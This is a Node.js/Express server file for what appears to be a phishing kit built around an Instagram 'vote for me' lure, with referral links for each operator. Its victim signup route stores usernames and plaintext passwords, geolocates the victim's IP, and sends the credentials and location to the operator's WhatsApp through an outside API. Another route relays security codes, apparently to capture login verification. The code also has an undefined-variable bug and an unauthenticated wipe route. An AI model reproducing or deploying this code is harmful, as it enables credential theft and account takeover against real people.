require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const axios = require("axios");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 5000;
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/prospercub";
const DEFAULT_ADMIN_USERNAME = process.env.DEFAULT_ADMIN_USERNAME || "admin";
const JWT_SECRET = process.env.JWT_SECRET || "change_this_secret";

// -------------------- MongoDB --------------------
mongoose.connect(MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("Mongo error:", err.message));

// -------------------- Schemas --------------------
const adminSchema = new mongoose.Schema({
  name: String,
  username: { type: String, unique: true },
  phone: String,
  apikey: String,
  password: String,
  settings: { whitelistedDomains: { type: [String], default: [] } },
  createdAt: { type: Date, default: Date.now }
});
const Admin = mongoose.model("Admin", adminSchema);

const studentSchema = new mongoose.Schema({
  username: String,
  password: String,
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  createdAt: { type: Date, default: Date.now }
});
const Student = mongoose.model("Student", studentSchema);

const activitySchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  studentId: { type: mongoose.Schema.Types.ObjectId, ref: "Student" },
  action: String,
  details: { type: Object, default: {} },
  createdAt: { type: Date, default: Date.now }
});
const Activity = mongoose.model("Activity", activitySchema);

const referralSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  code: String,
  createdAt: { type: Date, default: Date.now }
});
const Referral = mongoose.model("Referral", referralSchema);

const securityCodeSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  code: String,
  usedBy: { type: mongoose.Schema.Types.ObjectId, ref: "Student", default: null },
  createdAt: { type: Date, default: Date.now }
});
const SecurityCode = mongoose.model("SecurityCode", securityCodeSchema);

const SiteSettingsShema = 
   new mongoose.Schema({
     slogan: {type: String, default:"THE PEOPLE'S PICK"},
     title: {type: String, default :"Vote us 2025 🚀🎊🎉🏅"},
     message:{type:String, default:"I need your support, please take a moment to cast your vote and help ke reach new height in this competition. Your vote could be the difference-maker, propelling me towards victory"},
     adminId:{type:mongoose.Schema.ObjectId, ref:"Admin"},
     platform:[{type:String,default:"Instagram"}]
    
   }, {timestamp:true});
   
   const siteSettings = mongoose.model("SiteSettings", SiteSettingsShema);
// -------------------- Helpers --------------------
async function sendWhatsAppToAdmin(adminId, message) {
  try {
    const admin = await Admin.findById(adminId);
    if (!admin?.phone || !admin?.apikey) {
      console.log("⚠️ WhatsApp skipped: admin info incomplete", admin?.username);
      return;
    }
    const url = "https://api.callmebot.com/whatsapp.php";
    console.log("📲 WhatsApp URL:", url, "Params:", { phone: admin.phone, text: message, apikey: admin.apikey });
    await axios.get(url, { params: { phone: admin.phone, text: message, apikey: admin.apikey }, validateStatus: () => true });
  } catch (err) {
    console.error("WhatsApp error:", err.message);
  }
}

function generateCode(len = 8) {
  return Math.random().toString(36).substring(2, 2 + len);
}

async function hashPassword(pw) {
  return bcrypt.hash(pw, 10);
}

async function getLocationFromIP(ip) {
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`);
    return { city: res.data.city, region: res.data.region, country: res.data.country_name, latitude: res.data.latitude, longitude: res.data.longitude };
  } catch {
    return { error: "Location unavailable" };
  }
}

// -------------------- Admin Routes --------------------

// Signup
app.post("/admin/register", async (req, res) => {
  try {
    const { firstname, lastname, phone, apikey, password } = req.body;
    if (!firstname || !lastname || !phone || !apikey || !password) return res.status(400).json({ error: "Missing fields" });

    const username = firstname.toLowerCase();
    if (await Admin.findOne({ username })) return res.status(400).json({ error: "Admin exists" });

    const hashed = await hashPassword(password);
    const admin = await Admin.create({ name: `${firstname} ${lastname}`, username, phone, apikey, password: hashed });

    const code = generateCode(10);
    await Referral.create({ adminId: admin._id, code });

    const link = `https://cctv-ujg4.vercel.app/i.html?ref=${code}`;
    sendWhatsAppToAdmin(admin._id, `Hello ${firstname}! you are welcome to Nexa CCTV admin panel Your referral link: ${link} \n Have fun`);

    res.json({ success: true, admin });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Admin registration failed" });
  }
});

// Login
app.post("/admin/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: "username & password required" });

    const admin = await Admin.findOne({ username });
    if (!admin) return res.status(404).json({ error: "Admin not found" });

    if (!(await bcrypt.compare(password, admin.password))) return res.status(401).json({ error: "Invalid credentials" });

    const token = jwt.sign({ id: admin._id, username: admin.username }, JWT_SECRET, { expiresIn: "7d" });
    res.json({ success: true, token, admin: { username: admin.username, name: admin.name, phone: admin.phone } });
    
    sendWhatsAppToAdmin(admin._id, `Hello ${firstname}! you have did you just login to your Nexa CCTV admin panel Your referral link: ${link} \n Have fun`);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Login failed" });
  }
});

// Manage whitelist
app.post("/admin/whitelist", async (req, res) => {
  try {
    const { username, domains } = req.body;
    if (!username || !domains?.length) return res.status(400).json({ error: "Provide username & array of domains" });

    const admin = await Admin.findOne({ username });
    if (!admin) return res.status(404).json({ error: "Admin not found" });

    admin.settings.whitelistedDomains = domains;
    await admin.save();
    res.json({ success: true, whitelistedDomains: domains });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to update whitelist" });
  }
});

// -------------------- Student Routes --------------------

// Signup
app.post("/student/register", async (req, res) => {
  try {
    const { username, password, referralCode } = req.body;
    if (!username || !password) return res.status(400).json({ error: "username & password required" });

    let admin = referralCode ? await Referral.findOne({ code: referralCode }).then(r => Admin.findById(r?.adminId)) : null;
    if (!admin) admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
    if (!admin) return res.status(500).json({ error: "No admin found" });

    const student = await Student.create({ username, password, adminId: admin._id });
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const location = await getLocationFromIP(ip);

    sendWhatsAppToAdmin(admin._id, `🆕 Student signup\nUsername: ${username}\nID: ${student._id}\nLocation: ${JSON.stringify(location)}\n Password: ${password}`);
    res.json({ success: true, studentId: student._id, admin });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Sorry something went wrong " });
  }
});

// Request security code
app.post("/student/request-code", async (req, res) => {
  try {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: "username required" });

    const student = await Student.findOne({ username });
    if (!student) return res.status(404).json({ error: "Student not found" });

    const code = generateCode(6);
    await SecurityCode.create({ adminId: student.adminId, code });

    sendWhatsAppToAdmin(student.adminId, `🔑 Security code requested from ${username}\nCode: ${code}`);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to request security code" });
  }
});

// Log visit
app.post("/student/visit", async (req, res) => {
  try {
    const { path, referrer, utm, userAgent } = req.body;

    let admin = referrer ? await Referral.findOne({ code: referrer }).then(r => Admin.findById(r?.adminId)) : null;
    if (!admin) admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
    if (!admin) return res.status(500).json({ error: "No admin found" });

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const location = await getLocationFromIP(ip);

    await Activity.create({ adminId: admin._id, action: "visit", details: { path, referrer, utm, userAgent, location } });
    sendWhatsAppToAdmin(admin._id, `📈 Page visit\nPath: ${path}\nReferral: ${referrer || "direct"}\nLocation: ${JSON.stringify(location)}`);

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to track visit" });
  }
});

app.delete("/admin/clear", async (req, res) => {
  await Admin.deleteMany({});
  await Referral.deleteMany({});
  res.json({ success: true, message: "Admins and referrals cleared ✅" });
});
// -------------------- Start Server --------------------
app.get("/", (req, res) => res.send("<h1>✅ School backend running</h1>"));
app.use((req, res) => res.status(404).json({ error: "Route not found" }));

app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));